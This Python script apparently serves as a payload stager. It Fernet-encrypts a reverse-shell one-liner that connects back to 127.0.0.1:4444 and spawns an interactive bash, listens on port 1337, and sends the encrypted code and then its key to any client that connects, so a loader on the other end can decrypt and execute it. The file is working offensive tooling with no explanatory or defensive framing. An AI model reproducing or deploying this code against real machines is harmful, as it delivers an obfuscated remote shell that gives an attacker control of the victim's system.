#!/usr/bin/env python

import base64
import socket
import time

from cryptography.fernet import Fernet


class Server:
    def __init__(self):
        self.code = b'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("127.0.0.1",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
        self.server = ("127.0.0.1", 1337)

    def encrypt(self):
        self.key = Fernet.generate_key()
        self.cryptor = Fernet(self.key)
        self.code = self.cryptor.encrypt(self.code)
        self.key = base64.b64encode(self.key)

    def serve(self):
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server:
            server.bind(self.server)
            server.listen(1)
            print("[+] Listening for connections...")

            client, _ = server.accept()
            print(f"[+] Connection accepted from: {client}")

            client.send(self.code)
            print("[+] Code successfully sent")

            time.sleep(1)

            client.send(self.key)
            print("[+] Key successfully sent")

    def main(self):
        self.encrypt()
        self.serve()


if __name__ == "__main__":
    server = Server()
    server.main()
